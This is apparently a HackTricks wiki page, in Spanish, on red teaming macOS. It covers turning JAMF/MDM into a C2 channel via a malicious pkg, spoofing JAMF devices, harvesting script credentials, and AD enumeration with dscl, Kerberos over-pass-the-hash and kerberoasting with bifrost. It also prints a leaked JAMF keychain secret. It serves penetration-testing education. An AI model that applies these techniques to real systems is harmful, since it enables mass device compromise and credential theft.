# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Abusando de MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Si logras **comprometer las credenciales de administrador** para acceder a la plataforma de gestión, puedes **comprometer potencialmente todos los ordenadores** distribuyendo tu malware en las máquinas.

Para el red teaming en entornos MacOS, se recomienda tener un entendimiento de cómo funcionan los MDMs:

{{#ref}}
macos-mdm/
{{#endref}}

### Usando MDM como un C2

Un MDM tendrá permiso para instalar, consultar o eliminar perfiles, instalar aplicaciones, crear cuentas de administrador locales, establecer contraseña de firmware, cambiar la clave de FileVault...

Para ejecutar tu propio MDM necesitas **que tu CSR sea firmado por un proveedor** que podrías intentar obtener con [**https://mdmcert.download/**](https://mdmcert.download/). Y para ejecutar tu propio MDM para dispositivos Apple podrías usar [**MicroMDM**](https://github.com/micromdm/micromdm).

Sin embargo, para instalar una aplicación en un dispositivo inscrito, aún necesitas que esté firmada por una cuenta de desarrollador... sin embargo, al inscribir el dispositivo en un MDM, el **dispositivo agrega el certificado SSL del MDM como una CA de confianza**, por lo que ahora puedes firmar cualquier cosa.

Para inscribir el dispositivo en un MDM, necesitas instalar un **`mobileconfig`** como root, que podría ser entregado a través de un archivo **pkg** (podrías comprimirlo en zip y cuando se descargue desde Safari se descomprimirá).

**Mythic agent Orthrus** utiliza esta técnica.

### Abusando de JAMF PRO

JAMF puede ejecutar **scripts personalizados** (scripts desarrollados por el sysadmin), **payloads nativos** (creación de cuentas locales, establecer contraseña EFI, monitoreo de archivos/procesos...) y **MDM** (configuraciones de dispositivos, certificados de dispositivos...).

#### Autoinscripción de JAMF

Ve a una página como `https://<company-name>.jamfcloud.com/enroll/` para ver si tienen **autoinscripción habilitada**. Si la tienen, podría **pedir credenciales para acceder**.

Podrías usar el script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar un ataque de password spraying.

Además, después de encontrar credenciales adecuadas, podrías ser capaz de forzar otros nombres de usuario con el siguiente formulario:

![](<../../images/image (107).png>)

#### Autenticación de Dispositivo JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

El **binario `jamf`** contenía el secreto para abrir el llavero que en el momento del descubrimiento estaba **compartido** entre todos y era: **`jk23ucnq91jfu9aj`**.\
Además, jamf **persiste** como un **LaunchDaemon** en **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Toma de Control de Dispositivo JAMF

La **URL** de **JSS** (Jamf Software Server) que **`jamf`** utilizará se encuentra en **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Este archivo contiene básicamente la URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Entonces, un atacante podría dejar un paquete malicioso (`pkg`) que **sobrescriba este archivo** al instalarlo, configurando la **URL a un listener de Mythic C2 desde un agente Typhon** para poder abusar de JAMF como C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### Suplantación de JAMF

Para **suplantar la comunicación** entre un dispositivo y JMF necesitas:

- El **UUID** del dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- El **llavero de JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain` que contiene el certificado del dispositivo

Con esta información, **crea una VM** con el **UUID** de Hardware **robado** y con **SIP deshabilitado**, coloca el **llavero de JAMF,** **intercepta** el **agente** de Jamf y roba su información.

#### Robo de secretos

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

También podrías monitorear la ubicación `/Library/Application Support/Jamf/tmp/` para los **scripts personalizados** que los administradores podrían querer ejecutar a través de Jamf, ya que son **colocados aquí, ejecutados y eliminados**. Estos scripts **podrían contener credenciales**.

Sin embargo, las **credenciales** podrían ser pasadas a estos scripts como **parámetros**, por lo que necesitarías monitorear `ps aux | grep -i jamf` (sin siquiera ser root).

El script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) puede escuchar nuevos archivos que se añaden y nuevos argumentos de proceso.

### Acceso Remoto a macOS

Y también sobre los **protocolos** **"especiales"** de **red** de **MacOS**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

En algunas ocasiones encontrarás que el **computador MacOS está conectado a un AD**. En este escenario deberías intentar **enumerar** el directorio activo como estás acostumbrado. Encuentra algo de **ayuda** en las siguientes páginas:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Una **herramienta local de MacOS** que también puede ayudarte es `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
También hay algunas herramientas preparadas para MacOS para enumerar automáticamente el AD y jugar con kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound es una extensión de la herramienta de auditoría Bloodhound que permite recopilar e ingerir relaciones de Active Directory en hosts de MacOS.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost es un proyecto en Objective-C diseñado para interactuar con las APIs Heimdal krb5 en macOS. El objetivo del proyecto es habilitar mejores pruebas de seguridad en torno a Kerberos en dispositivos macOS utilizando APIs nativas sin requerir ningún otro marco o paquetes en el objetivo.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Herramienta de JavaScript para Automatización (JXA) para hacer enumeración de Active Directory.

### Información del Dominio
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Usuarios

Los tres tipos de usuarios de MacOS son:

- **Usuarios Locales** — Gestionados por el servicio local de OpenDirectory, no están conectados de ninguna manera al Active Directory.
- **Usuarios de Red** — Usuarios volátiles de Active Directory que requieren una conexión al servidor DC para autenticarse.
- **Usuarios Móviles** — Usuarios de Active Directory con una copia de seguridad local de sus credenciales y archivos.

La información local sobre usuarios y grupos se almacena en la carpeta _/var/db/dslocal/nodes/Default._\
Por ejemplo, la información sobre el usuario llamado _mark_ se almacena en _/var/db/dslocal/nodes/Default/users/mark.plist_ y la información sobre el grupo _admin_ está en _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Además de usar los bordes HasSession y AdminTo, **MacHound agrega tres nuevos bordes** a la base de datos de Bloodhound:

- **CanSSH** - entidad permitida para SSH al host
- **CanVNC** - entidad permitida para VNC al host
- **CanAE** - entidad permitida para ejecutar scripts de AppleEvent en el host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Más información en [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Contraseña de Computer$

Obtén contraseñas usando:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Es posible acceder a la **`Computer$`** contraseña dentro del llavero del Sistema.

### Over-Pass-The-Hash

Obtén un TGT para un usuario y servicio específicos:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Una vez que se ha recopilado el TGT, es posible inyectarlo en la sesión actual con:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Con los tickets de servicio obtenidos, es posible intentar acceder a recursos compartidos en otras computadoras:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Accediendo al llavero

El llavero probablemente contiene información sensible que, si se accede sin generar un aviso, podría ayudar a avanzar en un ejercicio de red team:

{{#ref}}
macos-keychain.md
{{#endref}}

## Servicios Externos

El Red Teaming en MacOS es diferente del Red Teaming regular en Windows, ya que generalmente **MacOS está integrado con varias plataformas externas directamente**. Una configuración común de MacOS es acceder a la computadora usando **credenciales sincronizadas de OneLogin y acceder a varios servicios externos** (como github, aws...) a través de OneLogin.

## Técnicas Misceláneas de Red Team

### Safari

Cuando se descarga un archivo en Safari, si es un archivo "seguro", se **abrirá automáticamente**. Así que, por ejemplo, si **descargas un zip**, se descomprimirá automáticamente:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Referencias

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
